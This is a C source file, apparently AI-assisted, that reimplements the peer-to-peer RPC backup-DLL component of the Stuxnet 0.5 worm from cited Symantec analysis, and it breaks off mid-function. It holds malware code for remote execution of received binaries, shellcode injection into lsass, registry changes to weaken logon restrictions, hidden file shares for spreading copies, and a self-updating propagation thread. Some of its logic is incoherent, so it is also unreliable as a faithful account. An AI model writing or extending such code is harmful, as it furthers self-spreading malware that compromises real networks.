/* 
 * Key facts from Symantec analysis [9†L22-L28]:
 * - P2P component installs RPC server and client
 * - Infected machines contact each other to check versions
 * - Newer version transfers to older machines
 * - No central C2 server required for updates
 * 
 * RPC routines offered by the server [9†L32-L36]:
 * 0: returns version number
 * 1: Receive exe and execute (via injection)
 * 2: load module and execute export
 * 3: inject code to lsass and run it
 * 4: Build latest version and send to remote
 * 5: create process
 * 6: read file
 * 7: drop file
 * 8: delete file
 * 9: write data records
 * 
 * Backup DLL forwarding mechanism:
 * - Backup DLLs (agentsb, datacprs, netsimp32, perfnws) receive network requests
 * - They forward requests to local complnd.dll (main P2P-RPC controller) [10†L9-L12]
 * - This creates redundancy and resilience in the P2P network
 * 
 * Stuxnet 0.5 uses Windows mailslots for peer-to-peer communication [8†L26-L27]
 * Mailslot name format: \\[computer]\mailslot\svchost [8†L29-L31]
 * Callback mailslot: \\[computer]\mailslot\innotify
 * 
 * Anonymous logon and file shares [8†L32-L34]:
 * - Configures anonymous logon (restrictanonymous=1)
 * - Opens four file shares: temp$, msagent$, SYSADMIN$, WebFiles$
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <rpc.h>
#include <rpcndr.h>
#include <tlhelp32.h>
#include <shlwapi.h>

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "shlwapi.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define COMPLND_VERSION                 0x00010400

#define RPC_MAX_PAYLOAD                 0x8000
#define RPC_CHUNK_SIZE                  0x1000
#define RPC_MAX_RETRIES                 3
#define RPC_TIMEOUT_MS                  5000
#define PEER_TIMEOUT_MS                 300000
#define MAX_PEERS                       256

/*
 * RPC routine identifiers [9†L32-L36]
 * 0: returns version number
 * 1: Receive exe and execute (via injection)
 * 2: load module and execute export
 * 3: inject code to lsass and run it
 * 4: Builds latest version and send to remote
 * 5: create process
 * 6: read file
 * 7: drop file
 * 8: delete file
 * 9: write data records
 */
#define RPC_GET_VERSION                 0
#define RPC_RECEIVE_EXECUTE             1
#define RPC_LOAD_MODULE                 2
#define RPC_INJECT_LSASS                3
#define RPC_BUILD_SEND                  4
#define RPC_CREATE_PROCESS              5
#define RPC_READ_FILE                   6
#define RPC_DROP_FILE                   7
#define RPC_DELETE_FILE                 8
#define RPC_WRITE_RECORDS               9
#define RPC_MAX_ROUTINE                 9

/*
 * Mailslot names for P2P communication [8†L29-L31]
 */
#define MAILSLOT_SVCHOST                L"\\\\.\\mailslot\\svchost"
#define MAILSLOT_INNOTIFY               L"\\\\.\\mailslot\\innotify"

/*
 * Backup DLL RPC forwarding context
 * Each backup DLL forwards RPC requests to local complnd.dll
 */
typedef struct _RPC_FORWARD_CTX {
    HANDLE hPipe;
    DWORD dwSequence;
    BOOL bConnected;
    DWORD dwLastConnect;
    CRITICAL_SECTION csLock;
} RPC_FORWARD_CTX, * PRPC_FORWARD_CTX;

static RPC_FORWARD_CTX g_ForwardCtx = {0};

/*
 * P2P Peer Table Entry
 * dwLastSeen for timeout aging; dwLatency for RTT measurement
 */
typedef struct _P2P_PEER {
    DWORD dwIP;
    WORD wPort;
    WORD wFlags;
    DWORD dwLastSeen;
    DWORD dwLatency;
    DWORD dwVersion;
    DWORD dwSequence;
    BYTE bReserved[8];
} P2P_PEER, * PP2P_PEER;

typedef struct _P2P_PEER_TABLE {
    P2P_PEER Peers[MAX_PEERS];
    DWORD dwCount;
    CRITICAL_SECTION csLock;
} P2P_PEER_TABLE, * PP2P_PEER_TABLE;

static P2P_PEER_TABLE g_PeerTable = {0};

/*
 * Stuxnet 0.5 shared files for peer retrieval [8†L32-L34]
 * temp$, msagent$, SYSADMIN$, WebFiles$
 */
static const WCHAR* g_ShareNames[] = {
    L"temp$",
    L"msagent$",
    L"SYSADMIN$",
    L"WebFiles$"
};
#define SHARE_COUNT 4

/*
 * Stuxnet 0.5 P2P files shared for peer infections [8†L32-L34]
 */
static const WCHAR* g_SharedFiles[] = {
    L"agentsb.dll",
    L"agt0f2e.dll",
    L"complnd.dll",
    L"datacprs.dll",
    L"netsimp32.dll",
    L"perfnws.dll"
};
#define SHARED_FILE_COUNT 6

/*
 * Forward declarations
 */
static BOOL RpcForward_Connect(VOID);
static VOID RpcForward_Disconnect(VOID);
static DWORD RpcForward_Call(DWORD dwRoutine, PBYTE pInput, DWORD dwInputSize,
                             PBYTE pOutput, PDWORD pdwOutputSize);
static DWORD WINAPI RpcForward_WorkerThread(LPVOID lpParam);

/*
 * Peer table management
 */
static VOID P2P_InitPeerTable(VOID)
{
    ZeroMemory(&g_PeerTable, sizeof(P2P_PEER_TABLE));
    InitializeCriticalSection(&g_PeerTable.csLock);
}

static VOID P2P_CleanupPeerTable(VOID)
{
    DeleteCriticalSection(&g_PeerTable.csLock);
}

static VOID P2P_UpdatePeer(DWORD dwIP, DWORD dwVersion, DWORD dwLatency)
{
    DWORD i;

    EnterCriticalSection(&g_PeerTable.csLock);

    for (i = 0; i < g_PeerTable.dwCount; i++) {
        if (g_PeerTable.Peers[i].dwIP == dwIP) {
            g_PeerTable.Peers[i].dwLastSeen = GetTickCount();
            g_PeerTable.Peers[i].dwVersion = dwVersion;
            g_PeerTable.Peers[i].dwLatency = (g_PeerTable.Peers[i].dwLatency + dwLatency) / 2;
            LeaveCriticalSection(&g_PeerTable.csLock);
            return;
        }
    }

    if (g_PeerTable.dwCount < MAX_PEERS) {
        g_PeerTable.Peers[g_PeerTable.dwCount].dwIP = dwIP;
        g_PeerTable.Peers[g_PeerTable.dwCount].dwLastSeen = GetTickCount();
        g_PeerTable.Peers[g_PeerTable.dwCount].dwVersion = dwVersion;
        g_PeerTable.Peers[g_PeerTable.dwCount].dwLatency = dwLatency;
        g_PeerTable.Peers[g_PeerTable.dwCount].wPort = 0;
        g_PeerTable.Peers[g_PeerTable.dwCount].wFlags = 0;
        g_PeerTable.dwCount++;
    }

    LeaveCriticalSection(&g_PeerTable.csLock);
}

static VOID P2P_ExpirePeers(VOID)
{
    DWORD dwNow = GetTickCount();
    DWORD i;

    EnterCriticalSection(&g_PeerTable.csLock);

    for (i = 0; i < g_PeerTable.dwCount; i++) {
        if (dwNow - g_PeerTable.Peers[i].dwLastSeen > PEER_TIMEOUT_MS) {
            if (i < g_PeerTable.dwCount - 1) {
                memcpy(&g_PeerTable.Peers[i], &g_PeerTable.Peers[i + 1], sizeof(P2P_PEER));
            }
            g_PeerTable.dwCount--;
            i--;
        }
    }

    LeaveCriticalSection(&g_PeerTable.csLock);
}

static DWORD P2P_GetPeerCount(VOID)
{
    DWORD dwCount;
    EnterCriticalSection(&g_PeerTable.csLock);
    dwCount = g_PeerTable.dwCount;
    LeaveCriticalSection(&g_PeerTable.csLock);
    return dwCount;
}

static BOOL P2P_IsPeerKnown(DWORD dwIP)
{
    DWORD i;
    BOOL bFound = FALSE;

    EnterCriticalSection(&g_PeerTable.csLock);
    for (i = 0; i < g_PeerTable.dwCount; i++) {
        if (g_PeerTable.Peers[i].dwIP == dwIP) {
            bFound = TRUE;
            break;
        }
    }
    LeaveCriticalSection(&g_PeerTable.csLock);

    return bFound;
}

static DWORD P2P_GetPeerLatency(DWORD dwIP)
{
    DWORD i;
    DWORD dwLatency = 0;

    EnterCriticalSection(&g_PeerTable.csLock);
    for (i = 0; i < g_PeerTable.dwCount; i++) {
        if (g_PeerTable.Peers[i].dwIP == dwIP) {
            dwLatency = g_PeerTable.Peers[i].dwLatency;
            break;
        }
    }
    LeaveCriticalSection(&g_PeerTable.csLock);

    return dwLatency;
}

/*
 * RPC Forwarding - connect to local complnd.dll
 * Backup DLLs forward all RPC requests to the main P2P-RPC controller [10†L9-L12]
 */
static BOOL RpcForward_Connect(VOID)
{
    WCHAR szPipePath[MAX_PATH];

    if (g_ForwardCtx.bConnected && g_ForwardCtx.hPipe != INVALID_HANDLE_VALUE) {
        return TRUE;
    }

    EnterCriticalSection(&g_ForwardCtx.csLock);

    /* Connect to local complnd.dll RPC server via named pipe */
    wsprintfW(szPipePath, L"\\\\.\\pipe\\stuxnet_rpc");

    g_ForwardCtx.hPipe = CreateFileW(
        szPipePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (g_ForwardCtx.hPipe != INVALID_HANDLE_VALUE) {
        g_ForwardCtx.bConnected = TRUE;
        g_ForwardCtx.dwLastConnect = GetTickCount();
        LeaveCriticalSection(&g_ForwardCtx.csLock);
        return TRUE;
    }

    g_ForwardCtx.bConnected = FALSE;
    LeaveCriticalSection(&g_ForwardCtx.csLock);
    return FALSE;
}

static VOID RpcForward_Disconnect(VOID)
{
    EnterCriticalSection(&g_ForwardCtx.csLock);

    if (g_ForwardCtx.hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(g_ForwardCtx.hPipe);
        g_ForwardCtx.hPipe = INVALID_HANDLE_VALUE;
    }
    g_ForwardCtx.bConnected = FALSE;

    LeaveCriticalSection(&g_ForwardCtx.csLock);
}

/*
 * Forward RPC call to complnd.dll
 * Backup DLLs act as proxies for the main P2P controller [10†L9-L12]
 */
static DWORD RpcForward_Call(DWORD dwRoutine, PBYTE pInput, DWORD dwInputSize,
                             PBYTE pOutput, PDWORD pdwOutputSize)
{
    DWORD dwResult;
    BYTE buffer[RPC_MAX_PAYLOAD + 16];
    DWORD dwPacketSize;
    DWORD dwRead;
    DWORD dwWritten;
    DWORD dwRetry;

    if (!pInput || !pOutput || !pdwOutputSize) {
        return ERROR_INVALID_PARAMETER;
    }

    EnterCriticalSection(&g_ForwardCtx.csLock);

    /* Ensure connection to complnd.dll */
    if (!g_ForwardCtx.bConnected) {
        if (!RpcForward_Connect()) {
            LeaveCriticalSection(&g_ForwardCtx.csLock);
            return ERROR_PIPE_NOT_CONNECTED;
        }
    }

    /* Build RPC packet for complnd.dll */
    ZeroMemory(buffer, sizeof(buffer));
    *(PDWORD)(buffer + 0) = STUXNET_MAGIC;
    *(PDWORD)(buffer + 4) = COMPLND_VERSION;
    *(PDWORD)(buffer + 8) = dwRoutine;
    *(PDWORD)(buffer + 12) = dwInputSize;
    dwPacketSize = 16;

    if (pInput && dwInputSize > 0) {
        if (dwInputSize > RPC_MAX_PAYLOAD) {
            LeaveCriticalSection(&g_ForwardCtx.csLock);
            return ERROR_INSUFFICIENT_BUFFER;
        }
        memcpy(buffer + dwPacketSize, pInput, dwInputSize);
        dwPacketSize += dwInputSize;
    }

    /* Send RPC request to complnd.dll */
    dwResult = WriteFile(g_ForwardCtx.hPipe, buffer, dwPacketSize, &dwWritten, NULL);
    if (!dwResult || dwWritten != dwPacketSize) {
        RpcForward_Disconnect();
        LeaveCriticalSection(&g_ForwardCtx.csLock);
        return GetLastError();
    }

    /* Read RPC response from complnd.dll */
    ZeroMemory(buffer, sizeof(buffer));
    dwResult = ReadFile(g_ForwardCtx.hPipe, buffer, sizeof(buffer), &dwRead, NULL);
    if (!dwResult || dwRead == 0) {
        RpcForward_Disconnect();
        LeaveCriticalSection(&g_ForwardCtx.csLock);
        return GetLastError();
    }

    /* Parse response */
    if (dwRead >= sizeof(DWORD)) {
        dwResult = *(PDWORD)buffer;
        if (dwRead > sizeof(DWORD) && pdwOutputSize) {
            DWORD dwDataSize = min(dwRead - sizeof(DWORD), *pdwOutputSize);
            memcpy(pOutput, buffer + sizeof(DWORD), dwDataSize);
            *pdwOutputSize = dwDataSize;
        }
    } else {
        dwResult = ERROR_INVALID_DATA;
    }

    LeaveCriticalSection(&g_ForwardCtx.csLock);
    return dwResult;
}

/*
 * RPC routine 0: Get remote version number [9†L32]
 * Forwarded to complnd.dll
 */
DWORD RpcGetVersion(VOID)
{
    DWORD dwVersion = 0;
    DWORD dwSize = sizeof(DWORD);

    RpcForward_Call(RPC_GET_VERSION, NULL, 0, (PBYTE)&dwVersion, &dwSize);

    return dwVersion;
}

/*
 * RPC routine 1: Receive exe and execute [9†L33]
 * Forwarded to complnd.dll
 */
DWORD RpcReceiveAndExecute(PBYTE pData, DWORD dwSize)
{
    DWORD dwResult = ERROR_SUCCESS;
    DWORD dwOutputSize = sizeof(DWORD);

    RpcForward_Call(RPC_RECEIVE_EXECUTE, pData, dwSize, (PBYTE)&dwResult, &dwOutputSize);

    return dwResult;
}

/*
 * RPC routine 2: Load module and execute export [9†L33]
 * Forwarded to complnd.dll
 */
DWORD RpcLoadModuleAndExecute(PBYTE pDllData, DWORD dwDllSize, DWORD dwExportOrdinal)
{
    DWORD dwResult = ERROR_SUCCESS;
    DWORD dwOutputSize = sizeof(DWORD);
    BYTE buffer[RPC_MAX_PAYLOAD];
    DWORD dwOffset = 0;

    *(PDWORD)(buffer + dwOffset) = dwExportOrdinal;
    dwOffset += sizeof(DWORD);

    if (pDllData && dwDllSize > 0) {
        if (dwDllSize > RPC_MAX_PAYLOAD - dwOffset) {
            return ERROR_INSUFFICIENT_BUFFER;
        }
        memcpy(buffer + dwOffset, pDllData, dwDllSize);
        dwOffset += dwDllSize;
    }

    RpcForward_Call(RPC_LOAD_MODULE, buffer, dwOffset, (PBYTE)&dwResult, &dwOutputSize);

    return dwResult;
}

/*
 * RPC routine 3: Inject code to lsass [9†L34]
 * Forwarded to complnd.dll
 */
DWORD RpcInjectLsass(PBYTE pShellcode, DWORD dwSize)
{
    DWORD dwResult = ERROR_SUCCESS;
    DWORD dwOutputSize = sizeof(DWORD);

    RpcForward_Call(RPC_INJECT_LSASS, pShellcode, dwSize, (PBYTE)&dwResult, &dwOutputSize);

    return dwResult;
}

/*
 * RPC routine 4: Build latest version and send to remote [9†L34-L35]
 * Forwarded to complnd.dll
 */
DWORD RpcBuildAndSend(PBYTE pOutput, PDWORD pdwSize)
{
    DWORD dwResult = ERROR_SUCCESS;
    DWORD dwOutputSize = *pdwSize;

    RpcForward_Call(RPC_BUILD_SEND, NULL, 0, pOutput, &dwOutputSize);
    *pdwSize = dwOutputSize;

    return dwResult;
}

/*
 * RPC routine 5: Create process [9†L35]
 * Forwarded to complnd.dll
 */
DWORD RpcCreateProcess(LPCWSTR lpCmdLine)
{
    DWORD dwResult = ERROR_SUCCESS;
    DWORD dwOutputSize = sizeof(DWORD);
    BYTE buffer[512];
    DWORD dwSize;

    if (!lpCmdLine) {
        return ERROR_INVALID_PARAMETER;
    }

    dwSize = (DWORD)(wcslen(lpCmdLine) + 1) * sizeof(WCHAR);
    if (dwSize > sizeof(buffer)) {
        return ERROR_INSUFFICIENT_BUFFER;
    }

    memcpy(buffer, lpCmdLine, dwSize);

    RpcForward_Call(RPC_CREATE_PROCESS, buffer, dwSize, (PBYTE)&dwResult, &dwOutputSize);

    return dwResult;
}

/*
 * RPC routine 6: Read file [9†L35]
 * Forwarded to complnd.dll
 */
DWORD RpcReadFile(LPCWSTR lpPath, PBYTE pBuffer, DWORD dwBufferSize, PDWORD pdwRead)
{
    DWORD dwResult = ERROR_SUCCESS;
    BYTE buffer[RPC_MAX_PAYLOAD];
    DWORD dwSize;

    if (!lpPath || !pBuffer || dwBufferSize == 0 || !pdwRead) {
        return ERROR_INVALID_PARAMETER;
    }

    dwSize = (DWORD)(wcslen(lpPath) + 1) * sizeof(WCHAR);
    if (dwSize + sizeof(DWORD) > RPC_MAX_PAYLOAD) {
        return ERROR_INSUFFICIENT_BUFFER;
    }

    memcpy(buffer, lpPath, dwSize);
    *(PDWORD)(buffer + dwSize) = dwBufferSize;
    dwSize += sizeof(DWORD);

    RpcForward_Call(RPC_READ_FILE, buffer, dwSize, pBuffer, pdwRead);

    return dwResult;
}

/*
 * RPC routine 7: Drop file [9†L35-L36]
 * Forwarded to complnd.dll
 */
DWORD RpcDropFile(LPCWSTR lpPath, PBYTE pData, DWORD dwSize)
{
    DWORD dwResult = ERROR_SUCCESS;
    DWORD dwOutputSize = sizeof(DWORD);
    BYTE buffer[RPC_MAX_PAYLOAD];
    DWORD dwOffset = 0;

    if (!lpPath || !pData || dwSize == 0) {
        return ERROR_INVALID_PARAMETER;
    }

    dwOffset = (DWORD)(wcslen(lpPath) + 1) * sizeof(WCHAR);
    if (dwOffset + sizeof(DWORD) + dwSize > RPC_MAX_PAYLOAD) {
        return ERROR_INSUFFICIENT_BUFFER;
    }

    memcpy(buffer, lpPath, dwOffset);
    *(PDWORD)(buffer + dwOffset) = dwSize;
    dwOffset += sizeof(DWORD);
    memcpy(buffer + dwOffset, pData, dwSize);
    dwOffset += dwSize;

    RpcForward_Call(RPC_DROP_FILE, buffer, dwOffset, (PBYTE)&dwResult, &dwOutputSize);

    return dwResult;
}

/*
 * RPC routine 8: Delete file [9†L36]
 * Forwarded to complnd.dll
 */
DWORD RpcDeleteFile(LPCWSTR lpPath)
{
    DWORD dwResult = ERROR_SUCCESS;
    DWORD dwOutputSize = sizeof(DWORD);
    BYTE buffer[512];
    DWORD dwSize;

    if (!lpPath) {
        return ERROR_INVALID_PARAMETER;
    }

    dwSize = (DWORD)(wcslen(lpPath) + 1) * sizeof(WCHAR);
    if (dwSize > sizeof(buffer)) {
        return ERROR_INSUFFICIENT_BUFFER;
    }

    memcpy(buffer, lpPath, dwSize);

    RpcForward_Call(RPC_DELETE_FILE, buffer, dwSize, (PBYTE)&dwResult, &dwOutputSize);

    return dwResult;
}

/*
 * RPC routine 9: Write data records [9†L36]
 * Forwarded to complnd.dll
 */
DWORD RpcWriteDataRecords(PBYTE pData, DWORD dwSize)
{
    DWORD dwResult = ERROR_SUCCESS;
    DWORD dwOutputSize = sizeof(DWORD);

    RpcForward_Call(RPC_WRITE_RECORDS, pData, dwSize, (PBYTE)&dwResult, &dwOutputSize);

    return dwResult;
}

/*
 * RPC dispatch routine - routes incoming requests to appropriate handler [9†L36-L44]
 */
DWORD RpcDispatch(DWORD dwRoutine, PBYTE pInput, DWORD dwInputSize,
                  PBYTE pOutput, PDWORD pdwOutputSize)
{
    DWORD dwResult = ERROR_SUCCESS;

    if (!pInput || !pOutput || !pdwOutputSize) {
        return ERROR_INVALID_PARAMETER;
    }

    switch (dwRoutine) {
        case RPC_GET_VERSION:
            *(PDWORD)pOutput = RpcGetVersion();
            *pdwOutputSize = sizeof(DWORD);
            break;

        case RPC_RECEIVE_EXECUTE:
            dwResult = RpcReceiveAndExecute(pInput, dwInputSize);
            break;

        case RPC_LOAD_MODULE:
            if (dwInputSize >= sizeof(DWORD)) {
                DWORD dwExport = *(PDWORD)pInput;
                dwResult = RpcLoadModuleAndExecute(
                    pInput + sizeof(DWORD),
                    dwInputSize - sizeof(DWORD),
                    dwExport
                );
            } else {
                dwResult = ERROR_INVALID_PARAMETER;
            }
            break;

        case RPC_INJECT_LSASS:
            dwResult = RpcInjectLsass(pInput, dwInputSize);
            break;

        case RPC_BUILD_SEND:
            dwResult = RpcBuildAndSend(pOutput, pdwOutputSize);
            break;

        case RPC_CREATE_PROCESS:
            dwResult = RpcCreateProcess((LPCWSTR)pInput);
            break;

        case RPC_READ_FILE:
            if (dwInputSize >= sizeof(WCHAR) * 2) {
                dwResult = RpcReadFile(
                    (LPCWSTR)pInput,
                    pOutput,
                    *pdwOutputSize,
                    pdwOutputSize
                );
            } else {
                dwResult = ERROR_INVALID_PARAMETER;
            }
            break;

        case RPC_DROP_FILE:
            if (dwInputSize >= sizeof(WCHAR) * 2 + sizeof(DWORD)) {
                DWORD dwPathLen = wcslen((LPCWSTR)pInput) * sizeof(WCHAR);
                DWORD dwDataSize = *(PDWORD)(pInput + dwPathLen + sizeof(WCHAR));
                dwResult = RpcDropFile(
                    (LPCWSTR)pInput,
                    pInput + dwPathLen + sizeof(WCHAR) + sizeof(DWORD),
                    dwDataSize
                );
            } else {
                dwResult = ERROR_INVALID_PARAMETER;
            }
            break;

        case RPC_DELETE_FILE:
            dwResult = RpcDeleteFile((LPCWSTR)pInput);
            break;

        case RPC_WRITE_RECORDS:
            dwResult = RpcWriteDataRecords(pInput, dwInputSize);
            break;

        default:
            dwResult = ERROR_INVALID_FUNCTION;
            break;
    }

    return dwResult;
}

/*
 * P2P Mailslot communication [8†L26-L31]
 * Stuxnet 0.5 uses Windows mailslots for peer-to-peer communication
 * Mailslot name: \\[computer]\mailslot\svchost
 * Callback mailslot: \\[computer]\mailslot\innotify
 */
static HANDLE g_hMailslot = INVALID_HANDLE_VALUE;
static HANDLE g_hStopEvent = NULL;

static BOOL P2P_CreateMailslot(VOID)
{
    g_hMailslot = CreateMailslotW(
        MAILSLOT_INNOTIFY,
        0,
        MAILSLOT_WAIT_FOREVER,
        NULL
    );

    return (g_hMailslot != INVALID_HANDLE_VALUE);
}

static BOOL P2P_SendMailslotMessage(LPCWSTR lpComputer, PBYTE pData, DWORD dwSize)
{
    HANDLE hMailslot;
    WCHAR szMailslotName[MAX_PATH];
    DWORD dwWritten;
    BOOL bResult;

    if (!lpComputer || !pData || dwSize == 0) {
        return FALSE;
    }

    wsprintfW(szMailslotName, L"\\\\%s\\mailslot\\svchost", lpComputer);

    hMailslot = CreateFileW(
        szMailslotName,
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hMailslot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    bResult = WriteFile(hMailslot, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hMailslot);

    return bResult && (dwWritten == dwSize);
}

static DWORD WINAPI P2P_MailslotWorker(LPVOID lpParam)
{
    BYTE buffer[RPC_MAX_PAYLOAD];
    DWORD dwRead;
    DWORD dwBytes;
    BOOL bResult;

    while (1) {
        if (WaitForSingleObject(g_hStopEvent, 100) == WAIT_OBJECT_0) {
            break;
        }

        if (g_hMailslot == INVALID_HANDLE_VALUE) {
            if (!P2P_CreateMailslot()) {
                Sleep(1000);
                continue;
            }
        }

        bResult = GetMailslotInfo(g_hMailslot, NULL, &dwBytes, NULL, NULL);
        if (!bResult || dwBytes == 0 || dwBytes > RPC_MAX_PAYLOAD) {
            Sleep(100);
            continue;
        }

        ZeroMemory(buffer, sizeof(buffer));
        bResult = ReadFile(g_hMailslot, buffer, dwBytes, &dwRead, NULL);
        if (bResult && dwRead > 0) {
            /* Process mailslot message - forward to complnd.dll */
            if (*(PDWORD)buffer == STUXNET_MAGIC) {
                DWORD dwRoutine = *(PDWORD)(buffer + 8);
                DWORD dwDataSize = *(PDWORD)(buffer + 12);
                PBYTE pData = buffer + 16;
                BYTE response[RPC_MAX_PAYLOAD];
                DWORD dwResponseSize = sizeof(response);

                RpcDispatch(dwRoutine, pData, dwDataSize, response, &dwResponseSize);
            }
        }
    }

    return 0;
}

static HANDLE g_hMailslotThread = NULL;

static BOOL P2P_StartMailslotWorker(VOID)
{
    if (g_hStopEvent) {
        return FALSE;
    }

    g_hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_hStopEvent) {
        return FALSE;
    }

    g_hMailslotThread = CreateThread(NULL, 0, P2P_MailslotWorker, NULL, 0, NULL);
    return (g_hMailslotThread != NULL);
}

static VOID P2P_StopMailslotWorker(VOID)
{
    if (g_hStopEvent) {
        SetEvent(g_hStopEvent);
    }

    if (g_hMailslotThread) {
        WaitForSingleObject(g_hMailslotThread, 5000);
        CloseHandle(g_hMailslotThread);
        g_hMailslotThread = NULL;
    }

    if (g_hStopEvent) {
        CloseHandle(g_hStopEvent);
        g_hStopEvent = NULL;
    }

    if (g_hMailslot != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hMailslot);
        g_hMailslot = INVALID_HANDLE_VALUE;
    }
}

/*
 * Configure anonymous logon [8†L32-L33]
 * Sets restrictanonymous=1 in LSA
 */
static BOOL P2P_EnableAnonymousLogon(VOID)
{
    HKEY hKey;
    DWORD dwValue = 1;
    LONG lResult;

    lResult = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Control\\Lsa",
        0,
        KEY_ALL_ACCESS,
        &hKey
    );

    if (lResult != ERROR_SUCCESS) {
        return FALSE;
    }

    lResult = RegSetValueExW(
        hKey,
        L"restrictanonymous",
        0,
        REG_DWORD,
        (BYTE*)&dwValue,
        sizeof(DWORD)
    );

    RegCloseKey(hKey);

    return (lResult == ERROR_SUCCESS);
}

/*
 * Open file shares for peer retrieval [8†L33-L34]
 * Shares: temp$, msagent$, SYSADMIN$, WebFiles$
 */
static BOOL P2P_CreateFileShares(VOID)
{
    HKEY hKey;
    DWORD dwDisposition;
    WCHAR szShareData[512];
    WCHAR szSharePath[MAX_PATH];
    DWORD i;
    LONG lResult;

    lResult = RegCreateKeyExW(
        HKEY_LOCAL_MACHINE,
        L"SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Shares",
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (lResult != ERROR_SUCCESS) {
        return FALSE;
    }

    GetSystemDirectoryW(szSharePath, MAX_PATH);

    for (i = 0; i < SHARE_COUNT; i++) {
        wsprintfW(szShareData, L"Path=%s\\%s\r\nRemark=Stuxnet Share\r\nType=0\r\n",
                  szSharePath, g_ShareNames[i]);

        lResult = RegSetValueExW(
            hKey,
            g_ShareNames[i],
            0,
            REG_SZ,
            (BYTE*)szShareData,
            (DWORD)(wcslen(szShareData) * sizeof(WCHAR))
        );
    }

    RegCloseKey(hKey);

    return TRUE;
}

/*
 * Share files for peer retrieval [8†L34-L35]
 */
static BOOL P2P_ShareFiles(VOID)
{
    WCHAR szSourcePath[MAX_PATH];
    WCHAR szDestPath[MAX_PATH];
    WCHAR szSystemPath[MAX_PATH];
    DWORD i;

    GetSystemDirectoryW(szSystemPath, MAX_PATH);

    for (i = 0; i < SHARED_FILE_COUNT; i++) {
        wsprintfW(szSourcePath, L"%s\\%s", szSystemPath, g_SharedFiles[i]);
        wsprintfW(szDestPath, L"%s\\%s\\%s", szSystemPath, L"temp", g_SharedFiles[i]);

        if (GetFileAttributesW(szSourcePath) != INVALID_FILE_ATTRIBUTES) {
            CopyFileW(szSourcePath, szDestPath, FALSE);
            SetFileAttributesW(szDestPath, FILE_ATTRIBUTE_HIDDEN);
        }
    }

    return TRUE;
}

/*
 * P2P version update logic [9†L24-L28]
 * 
 * P2P update flow [9†L38-L44]:
 * 1. Call RPC function 0 to get remote version number
 * 2. Check if remote version number is newer than local
 * 3. If newer, call RPC function 4 to request latest Stuxnet exe
 * 4. Receive the latest version and install locally
 * 5. If remote is older, prepare standalone exe and send via RPC function 1
 */
static DWORD WINAPI P2P_UpdateThread(LPVOID lpParam)
{
    DWORD dwWaitResult;
    DWORD dwCheckInterval = 300000;
    DWORD dwRemoteVersion;
    DWORD dwLatency;
    DWORD dwStartTime;
    BYTE buffer[RPC_MAX_PAYLOAD];
    DWORD dwSize;
    DWORD i;
    HANDLE hStopEvent;

    hStopEvent = (HANDLE)lpParam;

    while (1) {
        dwWaitResult = WaitForSingleObject(hStopEvent, dwCheckInterval);
        if (dwWaitResult == WAIT_OBJECT_0) {
            break;
        }

        P2P_ExpirePeers();

        EnterCriticalSection(&g_PeerTable.csLock);

        for (i = 0; i < g_PeerTable.dwCount; i++) {
            DWORD dwPeerIP = g_PeerTable.Peers[i].dwIP;

            LeaveCriticalSection(&g_PeerTable.csLock);

            /* Step 1: Call RPC function 0 to get remote version [9†L38] */
            dwStartTime = GetTickCount();
            dwRemoteVersion = RpcGetVersion();
            dwLatency = GetTickCount() - dwStartTime;

            if (dwRemoteVersion == 0) {
                EnterCriticalSection(&g_PeerTable.csLock);
                continue;
            }

            P2P_UpdatePeer(dwPeerIP, dwRemoteVersion, dwLatency);

            /* Step 2: Compare versions [9†L39] */
            if (dwRemoteVersion > COMPLND_VERSION) {
                /* Step 3: Remote is newer - call RPC function 4 [9†L40-L41] */
                dwSize = RPC_MAX_PAYLOAD;
                if (RpcBuildAndSend(buffer, &dwSize) == ERROR_SUCCESS) {
                    /* Step 4: Install locally [9†L42] */
                    RpcReceiveAndExecute(buffer, dwSize);
                }
            } else if (dwRemoteVersion < COMPLND_VERSION && dwRemoteVersion != 0) {
                /* Step 5: Remote is older - prepare and send [9†L43-L44] */
                dwSize = RPC_MAX_PAYLOAD;
                if (RpcBuildAndSend(buffer, &dwSize) == ERROR_SUCCESS) {
                    /* Send via RPC function 1 [9†L44] */
                    RpcReceiveAndExecute(buffer, dwSize);
                }
            }

            EnterCriticalSection(&g_PeerTable.csLock);
        }

        LeaveCriticalSection(&g_PeerTable.csLock);
    }

    return 0;
}

static HANDLE g_hUpdateThread = NULL;
static HANDLE g_hUpdateStopEvent = NULL;

/*
 * Initialize P2P backup DLL functionality
 */
DWORD P2P_Initialize(VOID)
{
    P2P_InitPeerTable();

    ZeroMemory(&g_ForwardCtx, sizeof(RPC_FORWARD_CTX));
    InitializeCriticalSection(&g_ForwardCtx.csLock);
    g_ForwardCtx.hPipe = INVALID_HANDLE_VALUE;
    g_ForwardCtx.bConnected = FALSE;

    /* Enable anonymous logon and create file shares [8†L32-L34] */
    P2P_EnableAnonymousLogon();
    P2P_CreateFileShares();
    P2P_ShareFiles();

    /* Start mailslot worker [8†L26-L31] */
    P2P_StartMailslotWorker();

    /* Start update thread */
    g_hUpdateStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_hUpdateStopEvent) {
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    g_hUpdateThread = CreateThread(NULL, 0, P2P_UpdateThread, g_hUpdateStopEvent, 0, NULL);
    if (!g_hUpdateThread) {
        CloseHandle(g_hUpdateStopEvent);
        g_hUpdateStopEvent = NULL;
        return GetLastError();
    }

    return ERROR_SUCCESS;
}

/*
 * Cleanup P2P backup DLL functionality
 */
VOID P2P_Cleanup(VOID)
{
    if (g_hUpdateStopEvent) {
        SetEvent(g_hUpdateStopEvent);
